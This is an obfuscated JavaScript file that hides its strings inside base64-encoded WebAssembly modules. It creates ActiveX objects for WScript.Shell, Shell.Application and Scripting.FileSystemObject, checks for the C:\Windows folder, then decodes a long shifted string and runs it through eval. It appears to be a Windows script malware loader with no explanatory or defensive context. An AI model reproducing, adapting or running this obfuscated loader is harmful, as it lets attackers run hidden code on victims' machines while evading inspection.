const __universalAtob = function (b64Encoded) {
    try {
        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
    }
};
const __forWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAABfwKkgICAAAMDZW52BHRlc3QAAQNlbnYGdXBkYXRlAAADZW52BGJvZHkAAAOCgICAAAEABISAgIAAAXAAAAWDgICAAAEAAQeRgICAAAIGbWVtb3J5AgAEZGF0YQADCpmAgIAAAZOAgIAAAAJAA0AQAEUNARACEAEMAAsLCw==';
const __forWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__forWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__forWasmBuffer, 'base64'));
    }
})());
const __ifWasmBuffer = 'AGFzbQEAAAABiICAgAACYAAAYAF/AAKfgICAAAIDZW52CGltcEZ1bmMxAAADZW52CGltcEZ1bmMyAAADgoCAgAABAQSEgICAAAFwAAAFg4CAgAABAAEHkYCAgAACBm1lbW9yeQIABGRhdGEAAgqSgICAAAGMgICAAAAgAARAEAAFEAELCw==';
const __ifWasmModule = new WebAssembly.Module((() => {
    try {
        let binary_string = atob(__ifWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binary_string.charCodeAt(i);
        }
        return bytes;
    } catch (err) {
        return new Uint8Array(global.Buffer.from(__ifWasmBuffer, 'base64'));
    }
})());
const __wasmStringModules = ['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MkElMjZBMyUyQiUzQSUyQiUyNjRBJTJCQyUyQkElMkIlMjYlMkIzMSUyNiUyQjhFJTIzKiolM0MAAEGOGAsBAABBkBgLBEhBQgAAQZYYCxpDS0FCQ0xNJTVDc09BQkNmQUJDdEFCQ3dBAABBshgLdkJDYXJFJTVDbWljQUJDckFCQ09BQkNzb0FCQ2Z0JTVDd0FCQ0luREFCQ29BQkNXQUJDcyUyMEFCQ250JTVDY1VBQkNyQUJDUkFCQ2VuQUJDdHZBQkNlUlNBQkNpb24lNUNTeVNBQkN0QUJDZW1BQkNSQUJDTwAAQaoZCwNvdAAAQa4ZC74BWnZaYXIlMjBIU0lablpGWnRQQ1pyWldaTE5tWkpBJTIwWiUzRFolMjBacVpLQVpGWmxaeFpCWmdSblplSHJaSVpidG9DWmYuUlplWmdaUmVaYWQoRktPa1p1bk1aZ0dwdGhTVVpBWi5yZVpwWmxaYWNaZSglMkZBQlpDJTJGZyUyQ1olMjAlMjIlMjJaKVopLmNoWmFyWkNvZFplWkFadFooelpvWmdhWk9aQ1VaSFpZZVRGdWRaSlopJTNCAABB7hoLAQAAQfAaCw5BY3RpdmVYT2JqZWN0AABBgBsLBWV2YWwA'].map(__bytes => {
    const bytesToUse = __universalAtob(__bytes);
    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
});
const lS = (wI, pos, iWC) => {
    let __str = '';
    if (!Array.isArray(wI)) {
        let __targetModule = __wasmStringModules[wI];
        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
        const __stringKey = `data${ pos }`;
        let __start = __targetModule.exports[__stringKey] - 1;
        let __str = '';
        let i = __start;
        let __c = __mem[i++];
        while (!(parseInt(__c) & 128) && __mem[i]) {
            __str += __c;
            __c = String.fromCharCode(__mem[i++]);
        }
        __str += __c;
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    } else {
        for (const __wasmIndex of wI) {
            let __targetModule = __wasmStringModules[__wasmIndex];
            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
            const __stringKey = `data${ pos }`;
            let __start = __targetModule.exports[__stringKey] - 1;
            let i = __start;
            let __c = __mem[i++];
            while (!(parseInt(__c) & 128) && __mem[i]) {
                __str += __c;
                __c = String.fromCharCode(__mem[i++]);
            }
            __str += __c;
        }
        __str = decodeURIComponent(__str.substring(1));
        return __str;
    }
};
var aWApQKbIvoUOgDC = new window[(lS(0, 74, true))](lS(0, 0));
var qKAFlxBgRneHrIbtoCf = new window[(lS(0, 74, true))](lS(0, 1));
var DEzkvfiLCJQrltaGxTp = new window[(lS(0, 74, true))](lS(0, 2));
(() => {
    const __ifInstance0 = new WebAssembly.Instance(__ifWasmModule, {
        env: {
            impFunc1: () => {
                {
                    var FrKbwktQCqsDdPRNA = lS(0, 4) + lS(0, 5) + lS(0, 6) + lS(0, 7) + lS(0, 8) + lS(0, 9) + lS(0, 10) + lS(0, 11) + lS(0, 12) + lS(0, 13) + lS(0, 14) + lS(0, 15) + lS(0, 16) + lS(0, 17) + lS(0, 18) + lS(0, 19) + lS(0, 20) + lS(0, 21) + lS(0, 22) + lS(0, 23) + lS(0, 24) + lS(0, 25) + lS(0, 26) + lS(0, 27) + lS(0, 28) + lS(0, 29) + lS(0, 30) + lS(0, 31) + lS(0, 32) + lS(0, 33) + lS(0, 34) + lS(0, 35) + lS(0, 36) + lS(0, 37) + lS(0, 38) + lS(0, 39) + lS(0, 40) + lS(0, 41) + lS(0, 42) + lS(0, 43) + lS(0, 44) + lS(0, 45) + lS(0, 46) + lS(0, 47) + lS(0, 48) + lS(0, 49) + lS(0, 50) + lS(0, 51) + lS(0, 52) + lS(0, 53) + lS(0, 54) + lS(0, 55) + lS(0, 56) + lS(0, 57) + lS(0, 58) + lS(0, 59) + lS(0, 60) + lS(0, 61) + lS(0, 62) + lS(0, 63) + lS(0, 64) + lS(0, 65) + lS(0, 66);
                    var zogaOCUHYeTFudJ = 46579880 / 46579880;
                    var oYTnDbghOjmRluzvpA = lS(0, 67);
                    var FKOkunMgGpthSUA = lS(0, 68) + lS(0, 69) + lS(0, 70) + lS(0, 71);
                    window[lS(0, 75, true)](lS(0, 72).replace(/\Z/g, lS(0, 73)));
                    (() => {
                        var paTIVqMOgbhYndlF = 0;
                        const __forInstance0 = new WebAssembly.Instance(__forWasmModule, {
                            env: {
                                test: () => {
                                    return paTIVqMOgbhYndlF < FrKbwktQCqsDdPRNA.length ? 1 : 0;
                                },
                                update: () => {
                                    paTIVqMOgbhYndlF++;
                                },
                                body: () => {
                                    {
                                        zogaOCUHYeTFudJ = FrKbwktQCqsDdPRNA.charCodeAt(paTIVqMOgbhYndlF) - HSInFtPCrWLNmJA * 8583 / 497814;
                                        (() => {
                                            const __ifInstance1 = new WebAssembly.Instance(__ifWasmModule, {
                                                env: {
                                                    impFunc1: () => {
                                                        {
                                                            oYTnDbghOjmRluzvpA += String.fromCharCode(zogaOCUHYeTFudJ);
                                                        }
                                                    },
                                                    impFunc2: () => {
                                                    }
                                                }
                                            });
                                            const __exports = __ifInstance1.exports;
                                            return __exports.data(zogaOCUHYeTFudJ != HSInFtPCrWLNmJA * 218820 / 302180 && zogaOCUHYeTFudJ != HSInFtPCrWLNmJA * 571456 / 517882 ? 1 : 0);
                                        })();
                                    }
                                }
                            }
                        });
                        const __exports = __forInstance0.exports;
                        return __exports.data();
                    })();
                    var QBYUmorKRSzxJvik = window[lS(0, 75, true)](oYTnDbghOjmRluzvpA);
                }
            },
            impFunc2: () => {
            }
        }
    });
    const __exports = __ifInstance0.exports;
    return __exports.data(DEzkvfiLCJQrltaGxTp.FolderExists(lS(0, 3)) == true ? 1 : 0);
})();